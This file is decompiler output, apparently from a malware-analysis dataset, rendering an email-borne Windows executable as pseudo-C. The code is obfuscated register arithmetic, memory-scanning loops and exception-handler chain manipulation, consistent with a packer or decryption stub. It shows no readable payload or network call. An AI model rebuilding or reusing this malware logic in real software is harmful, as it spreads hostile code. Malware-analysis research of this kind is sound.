// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0664/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn080010D7(word32 edx, word32 ebx, word32 ebp, word32 esi, word32 edi, selector fs, word32 dwArg00)
{
fn080010D7_entry:
l080010D7:
	word32 edi_8 = __ror(edi, 0x16)
	byte al_17 = Mem0[dwArg00 - 0xFFFFFFF9:byte]
	word32 edx_21 = ~(edx | 0x266C65F3)
	word16 si_15 = (word16) (esi ^ 0xD08F1CE3)
	word32 eax_18 = (word32) al_17
	word16 ax_20 = DPB(ax, al_17, 0, 8)
	word16 dx_22 = (word16) edx_21
	branch eax_18 == 0x00000090 l08001133
l08001106:
	word16 ax_38 = __ror(ax_20, 0x06)
	Mem47[ebx + 0x00000000:word32] = Mem0[ebx + 0x00000000:word32] - 0x001DCFC1 - ((edi_8 + 0x22A4B2A3) - ebx <u 0x00000000)
	word32 eax_40 = DPB(eax_18, ax_38, 0, 16)
	Mem49[eax_40 + 0x00000000:byte] = Mem47[eax_40 + 0x00000000:byte] + (byte) ax_38
	Mem51[0x4643C881:word32] = Mem49[0x4643C881:word32] ^ eax_40
	__indw(dx_22)
	return
l08001133:
	word32 ecx_63
	word32 ebp_64
	word32 esi_65
	word32 edi_66
	word32 eax_69 = DPB(fn0800114D(edx_21, ebp, edi_8 + 0x22A4B2A3, (word16) (dwArg00 - 0xFFFFFFF9 + ebp), si_15, fs, dwLoc04, dwArg00, out ecx_63, out ebp_64, out esi_65, out edi_66), __inb(0x00), 0, 8)
	branch P l0800113E_thunk_fn08001180
	goto l08001140
l0800113E_thunk_fn08001180:
	word32 ecx_72
	word32 ebp_73
	word32 esi_74
	word32 edi_75
	fn08001180(eax_69, ecx_63, ebp_64, esi_65, edi_66, fs, out ecx_72, out ebp_73, out esi_74, out edi_75)
	return
l08001140:
fn080010D7_exit:
}

word32 fn0800114D(word32 edx, word32 ebp, word32 edi, word16 cx, word16 si, selector fs, word32 dwArg00, word32 dwArg04, ptr32 ecxOut, ptr32 ebpOut, ptr32 esiOut, ptr32 ediOut)
{
	__rol(cx, 0x06);
	__rol(si, 0x01);
	word32 eax_26 = DPB(__rol(0xB00120C0, 0x04), (word16) (fp + 0x00000004), 0, 16);
	word32 edi_29 = Mem0[eax_26 + 0x00000000:word32];
	word32 esi_37 = Mem0[0x080010D3:word32];
	word32 ecx_41;
	word32 ebp_42;
	word32 esi_43;
	word32 edi_44;
	return fn08001180(eax_26, 0x080010A8, ebp, esi_37, edi_29, fs, out ecx_41, out ebp_42, out esi_43, out edi_44);
}

word32 fn08001180(word32 eax, word32 ecx, word32 ebp, word32 esi, word32 edi, selector fs, ptr32 ecxOut, ptr32 ebpOut, ptr32 esiOut, ptr32 ediOut)
{
	esp = fp;
	v5 = Mem0[eax + 0x00000000:byte] + al;
	Mem0[eax + 0x00000000:byte] = v5;
	eax = eax << 0x0000000A;
	al = (byte) eax;
	SCZO = cond(eax);
	eax = fn08001185(eax, ecx, ebp, esi, edi, fs, out ecx, out ebp, out esi, out edi);
	al = (byte) eax;
	return eax;
}

word32 fn08001185(word32 eax, word32 ecx, word32 ebp, word32 esi, word32 edi, selector fs, ptr32 ecxOut, ptr32 ebpOut, ptr32 esiOut, ptr32 ediOut)
{
	do
		edi = edi + 0x00000001;
	while (~Mem0[edi + 0x00000000:word32] + esi != 0x00000001);
	word32 esi_31 = -__rol(esi, 0x0D);
	word32 edx_33 = (word32) Mem0[edi - 0xFFFFFFFD:word16];
	word32 esi_50 = DPB(esi_31 >> 0x0000000D, __rol((word16) (esi_31 >> 0x0000000D), 0x03), 0, 16);
	word32 eax_53 = Mem0[fp - 0x00000004:word32];
	__ror(esi_50, 0x03);
	word32 edx_58 = Mem0[0x08001025:word32];
	do
	{
		eax_53 = eax_53 + 0x00000001;
		word32 edi_73 = Mem0[eax_53 + 0x00000000:word32] ^ edx_58;
	} while (edi_73 != 0x00000000);
	word32 eax_94 = __rol(edx_33, 0x0F);
	word32 edx_96 = Mem0[fs:0x00000000:word32];
	Mem104[fs:0x00000000:word32] = fp - 0x00000008;
	word32 ebp_113;
	*ebpOut = __rol(edx_96, 0x12);
	word32 ecx_109;
	*ecxOut = ~(fp - 0x00000008);
	word32 edi_115;
	*ediOut = __ror(DPB(edi_73 - 0x00000001, (word16) (edi_73 - 0x00000001) | 0xFFDF, 0, 16), 0x03);
	word32 esi_119;
	*esiOut = eax_53;
	return eax_94;
}

